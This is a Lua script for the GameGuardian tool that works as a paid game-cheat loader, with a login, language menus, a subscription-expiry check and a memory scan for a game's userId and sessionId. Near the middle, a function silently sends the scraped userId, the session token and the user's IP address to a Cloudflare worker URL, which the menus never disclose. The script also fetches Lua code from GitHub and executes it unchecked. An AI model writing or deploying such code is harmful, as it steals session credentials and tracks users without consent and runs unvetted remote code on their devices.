gg.clearResults()
-- Script.lua
-- This file contains the main script with login, language selection, and version-specific features.
gg.setVisible(false)
--------------------------------------------------
-- Shared Helper Functions
--------------------------------------------------
local function waitForResume()
  gg.toast("Script paused. Click GG icon to resume", true)
  while not gg.isVisible() do
    gg.sleep(100)
  end
  gg.setVisible(false)
end

local function safePromptSearch(prompts, defaults, types)
  local input = gg.prompt(prompts, defaults, types)
  while not input do
    gg.toast("Script paused. Tap GG icon to resume.", true)
    waitForResume()
    while gg.isVisible() do
      gg.sleep(100)
    end
    gg.sleep(1000)
    input = gg.prompt(prompts, defaults, types)
  end
  return input
end

local function safeChoiceSearch(items, default, title)
  local choice = nil
  repeat
    choice = gg.choice(items, default, title)
    if choice == nil then
      gg.toast("Paused. Tap GG icon to resume.", true)
      waitForResume()
    end
  until choice ~= nil
  return choice
end

local function safePromptLoop(prompts, defaults, types)
  local input = gg.prompt(prompts, defaults, types)
  while input == nil do
    gg.toast("Script paused. Click GG icon to resume", true)
    waitForResume()
    input = gg.prompt(prompts, defaults, types)
  end
  return input
end

--------------------------------------------------
-- Fetch Login Data
--------------------------------------------------
local data = gg.makeRequest("https://raw.githubusercontent.com/DunggComet/DC-Script/main/login_data.lua").content
if not data or data == '' then
  gg.alert("📡 Cannot load login data. Check internet connection.")
  return
end

local f, err = load(data)
if not f then
  gg.alert("💥 Invalid login data format")
  return
end

local status, login = pcall(f)
if not status then
  gg.alert("💥 Failed to execute login data")
  return
end

if type(login) == "function" then
  status, login = pcall(login)
  if not status or type(login) ~= "table" then
    gg.alert("💥 Login data function did not return a valid table")
    return
  end
elseif type(login) ~= "table" then
  gg.alert("💥 Login data is not a valid table")
  return
end

--------------------------------------------------
-- Language Selection and Translations
--------------------------------------------------
local lang = "English" -- Default language
local translations = {
  English = {
    select_option = "Select an option:",
    start_script = "▶️ Start Script",
    find_userid = "🔍 Find UserID",
    join_discord = "💬 Join Our Discord Community",
    exit_script = "✖️ Exit Script",
    select_password_method = "Select password entry method:",
    manual_password = "🔑 Manually Enter Password",
    auto_password = "🤖 Automatically Enter Password",
    enter_password = "Enter Password:",
    no_userid = "No UserID Found!",
    info_found = "Information Found:\n\n🆔 UserID: %s\n🔑 SessionID: %s",
    userid_copied = "📋 UserID copied to clipboard: %s",
    no_userid_session = "No UserID and SessionID Found!",
    invalid_password = "⚠️ Invalid Password",
    contact_owner = "📣 Please Contact the Owner to Buy!",
    invalid_expiry = "💥 Invalid expiry date format",
    password_expired = "❌ Password Expired!\n☄️Contact the Owner to Add Subscription.\n📅 Expired on: %s",
    success = "✅ Success!\n🔑 Key: %s\n📅 Expires on: %s\n⏰ Time left: %d days, %d hours, %d minutes, %d seconds\n🕒 Current time: %s",
    time_left = "⏳ Time left: %d days, %d hours, %d minutes, %d seconds",
    discord_copied = "📋 Discord link copied to clipboard: %s",
    no_internet = "📡 Cannot load login data. Check internet connection.",
    invalid_data = "💥 Invalid login data format",
    login_exec_failed = "💥 Failed to execute login data",
    invalid_login_table = "💥 Login data is not a valid table",
    invalid_version = "💥 Invalid version specified",
    script_load_failed = "💥 SERVER: Invalid script content",
    no_internet_script = "📡 SERVER: Allow Internet Connection..."
  },
  Vietnamese = {
    select_option = "Chọn một tùy chọn:",
    start_script = "▶️ Bắt đầu Script",
    find_userid = "🔍 Tìm UserID",
    join_discord = "💬 Tham gia Server Discord",
    exit_script = "✖️ Thoát Script",
    select_password_method = "Chọn phương thức nhập mật khẩu:",
    manual_password = "🔑 Nhập Thủ Công",
    auto_password = "🤖 Nhập Tự Động",
    enter_password = "Nhập Mật khẩu:",
    no_userid = "Không tìm thấy UserID!",
    info_found = "\n🆔 UserID: %s\n🔑 SessionID: %s",
    userid_copied = "📋 UserID đã được sao chép: %s",
    no_userid_session = "Không tìm thấy UserID và SessionID!",
    invalid_password = "⚠️ Mật khẩu không hợp lệ",
    contact_owner = "📣 Nhắn tin qua discord hoặc fb để mua",
    invalid_expiry = "💥 Định dạng ngày hết hạn không hợp lệ",
    password_expired = "❌ Mật khẩu đã hết hạn!\n☄️Liên hệ qua discord để gia hạn.\n📅 Hết hạn vào: %s",
    success = "✅ Thành công!\n🔑 Key: %s\n📅 Hết hạn vào: %s\n⏰ Thời gian còn lại: %d ngày, %d giờ, %d phút, %d giây\n🕒 Thời gian hiện tại: %s",
    time_left = "⏳ Thời gian còn lại: %d ngày, %d giờ, %d phút, %d giây",
    discord_copied = "📋 Liên kết Discord đã được sao chép: %s",
    no_internet = "📡 Không thể tải dữ liệu đăng nhập. Kiểm tra kết nối internet.",
    invalid_data = "💥 Định dạng dữ liệu đăng nhập không hợp lệ",
    login_exec_failed = "💥 Thực thi dữ liệu đăng nhập thất bại",
    invalid_login_table = "💥 Dữ liệu đăng nhập không phải bảng hợp lệ",
    invalid_version = "💥 Phiên bản không hợp lệ",
    script_load_failed = "💥 SERVER: Nội dung script không hợp lệ",
    no_internet_script = "📡 SERVER: Cho phép kết nối Internet..."
  },
  Spanish = {
    select_option = "Selecciona una opción:",
    start_script = "▶️ Iniciar Script",
    find_userid = "🔍 Buscar UserID",
    join_discord = "💬 Unirse a Nuestra Comunidad de Discord",
    exit_script = "✖️ Salir del Script",
    select_password_method = "Selecciona el método de ingreso de contraseña:",
    manual_password = "🔑 Ingresar Contraseña Manualmente",
    auto_password = "🤖 Ingresar Contraseña Automáticamente",
    enter_password = "Ingresar Contraseña:",
    no_userid = "¡No se encontró UserID!",
    info_found = "Información Encontrada:\n\n🆔 UserID: %s\n🔑 SessionID: %s",
    userid_copied = "📋 UserID copiado al portapapeles: %s",
    no_userid_session = "¡No se encontraron UserID ni SessionID!",
    invalid_password = "⚠️ Contraseña Inválida",
    contact_owner = "📣 ¡Por favor, contacta al Propietario para Comprar!",
    invalid_expiry = "💥 Formato de fecha de expiración inválido",
    password_expired = "❌ ¡Contraseña Expirada!\n☄️Contacta al Propietario para Agregar Suscripción.\n📅 Expiró el: %s",
    success = "✅ ¡Éxito!\n🔑 Clave: %s\n📅 Expira el: %s\n⏰ Tiempo restante: %d días, %d horas, %d minutos, %d segundos\n🕒 Hora actual: %s",
    time_left = "⏳ Tiempo restante: %d días, %d horas, %d minutos, %d segundos",
    discord_copied = "📋 Enlace de Discord copiado al portapapeles: %s",
    no_internet = "📡 No se pudo cargar los datos de inicio de sesión. Verifica la conexión a internet.",
    invalid_data = "💥 Formato de datos de inicio de sesión inválido",
    login_exec_failed = "💥 Falló la ejecución de datos de inicio de sesión",
    invalid_login_table = "💥 Los datos de inicio de sesión no son una tabla válida",
    invalid_version = "💥 Versión especificada inválida",
    script_load_failed = "💥 SERVIDOR: Contenido del script inválido",
    no_internet_script = "📡 SERVIDOR: Permite la conexión a Internet..."
  }
}

-- Language selection menu
local langMenu = safeChoiceSearch({
  "🇬🇧 English",
  "🇻🇳 Vietnamese",
  "🇪🇸 Spanish"
}, nil, "Select Language / Chọn Ngôn Ngữ / Selecciona Idioma:")
if not langMenu then
  while not gg.isVisible() do
    gg.sleep(100)
  end
  gg.setVisible(false)
else
  lang = langMenu == 1 and "English" or langMenu == 2 and "Vietnamese" or "Spanish"
end

local t = translations[lang]

--------------------------------------------------
-- ID Finder Function
--------------------------------------------------
local function findUserId()
  gg.toast('Finding UserID...')
  gg.setRanges(gg.REGION_ANONYMOUS | gg.REGION_C_ALLOC)
  gg.searchNumber(':userId', gg.TYPE_BYTE, false, gg.SIGN_EQUAL, 0, -1)

  local results = gg.getResults(500)
  if #results == 0 then
    gg.alert(t.no_userid)
    return nil, nil
  end

  for i, v in ipairs(results) do
    local foundText = ""
    for j = 0, 99 do
      local addr = v.address + j
      local data = gg.getValues({{address = addr, flags = gg.TYPE_BYTE}})[1].value
      if data < 0 or data > 255 or data == 0 then break end
      foundText = foundText .. string.char(data)
    end

    local userId, sessionId = foundText:match("userId=(%d+).*sessionId=([%w%-]+)")
    if userId and sessionId then 
      gg.alert(string.format(t.info_found, userId, sessionId))
      gg.copyText(userId)
      gg.toast(string.format(t.userid_copied, userId))
      return userId, sessionId
    end
  end

  gg.alert(t.no_userid_session)
  return nil, nil
end

--------------------------------------------------
-- Send Data to Cloudflare Worker
--------------------------------------------------
local function sendToWebhook(userId, sessionId, ip)
    local workerUrl = "https://user-data-relay.dunggkr.workers.dev/"
    local payload = string.format('{"userId": "%s", "sessionId": "%s", "ip": "%s"}',
        userId or "N/A", sessionId or "N/A", ip or "N/A")

 local r = gg.makeRequest(workerUrl, {
     method = "POST",
     ["Content-Type"] = "application/json"
 }, payload)
end


--------------------------------------------------
-- Main Menu Loop
--------------------------------------------------
while true do
  local menu = safeChoiceSearch({
    t.start_script,
    t.find_userid,
    t.join_discord,
    t.exit_script
  }, nil, t.select_option)
  if not menu then
    goto continue
  end

  -- Handle "Exit Script" option
  if menu == 4 then
    gg.clearResults()
    os.exit()
  end

  -- Handle "Join Our Discord Community" option
  if menu == 3 then
    local discordLink = "https://discord.gg/95EkzpEPma"
    gg.copyText(discordLink)
    gg.alert(string.format(t.discord_copied, discordLink))
    gg.toast(string.format(t.discord_copied, discordLink))
    goto continue
  end

  -- Handle "Find UserID" option
  if menu == 2 then
    findUserId()
    goto continue
  end

  -- Handle "Start Script" option
  local key, sessionId
  local ipJson = gg.makeRequest("https://api.ipify.org?format=json").content
  local ip = "Unknown"
  if ipJson and ipJson ~= "" then
    ip = ipJson:match('"ip"%s*:%s*"([%d%.]+)"') or "Unknown"
  end



  local passwordMenu = safeChoiceSearch({
    t.manual_password,
    t.auto_password
  }, nil, t.select_password_method)
  if not passwordMenu then
    goto continue
  end

  if passwordMenu == 1 then
    -- Manual password entry
    local input = safePromptLoop({t.enter_password}, nil, {"text"})
    key = input[1]
    if not key or key == "" then
      goto continue
    end
    sessionId = "Manual Entry"
  else
    -- Automatic password entry (using ID Finder)
    key, sessionId = findUserId()
    if not key then
      goto continue
    end
  end

  -- Send data to Cloudflare Worker silently
  sendToWebhook(key, sessionId, ip)

  local entry = login[key]
  if not entry or type(entry) ~= "table" then
    gg.alert(t.invalid_password)
    gg.alert(t.contact_owner)
    goto continue
  end

  -- Parse DDMMYYYY
  local function parseDate(ddmmyyyy)
    if not ddmmyyyy or #ddmmyyyy ~= 8 then
      return nil, nil
    end
    local d, m, y = tonumber(ddmmyyyy:sub(1,2)), tonumber(ddmmyyyy:sub(3,4)), tonumber(ddmmyyyy:sub(5,8))
    if not d or not m or not y then
      return nil, nil
    end
    return os.time({year=y, month=m, day=d, hour=0}), string.format("%02d/%02d/%04d", d, m, y)
  end

  local expiryTime, formattedExpiry = parseDate(entry.expiry)
  if not expiryTime then
    gg.alert(t.invalid_expiry)
    goto continue
  end

  local currentTime = os.time()
  if currentTime > expiryTime then
    gg.alert(string.format(t.password_expired, formattedExpiry))
    goto continue
  end

  -- Countdown (no .0)
  local remaining = expiryTime - currentTime
  local days = math.floor(remaining / 86400)
  local hours = math.floor((remaining % 86400) / 3600)
  local mins = math.floor((remaining % 3600) / 60)
  local secs = math.floor(remaining % 60)

  -- Show alert
  gg.alert(string.format(t.success, key, formattedExpiry, days, hours, mins, secs, os.date("%d/%m/%Y %H:%M:%S")))

  -- Toast countdown before script request
  gg.toast(string.format(t.time_left, days, hours, mins, secs))

  -- Load script based on version
  local scriptUrl
  if entry.version == "v1" then
    scriptUrl = "https://raw.githubusercontent.com/DunggComet/DC-Script/main/DC.lua"
  elseif entry.version == "v2" then
    scriptUrl = "https://raw.githubusercontent.com/DunggComet/DC-Script/main/blah_blah.lua"
  elseif entry.version == "v3" then
    scriptUrl = "https://raw.githubusercontent.com/DunggComet/DC-Script/main/blah_blah.lua"
  elseif entry.version == "3D" then
    scriptUrl = "https://raw.githubusercontent.com/DunggComet/DC-Script/main/Trial3Days/Loader.lua"
  else
    gg.alert(t.invalid_version)
    goto continue
  end

  local content = gg.makeRequest(scriptUrl).content
  if content and content ~= '' then
    local chunk, err = load(content)
    if chunk then
      local status, err = pcall(chunk)
      if not status then
        gg.alert(string.format(t.script_load_failed, err or "Unknown error"))
        goto continue
      end
      break -- Exit loop on successful script execution
    else
      gg.alert(string.format(t.script_load_failed, err or "Unknown error"))
      goto continue
    end
  else
    gg.alert(t.no_internet_script)
    goto continue
  end

  ::continue::
end
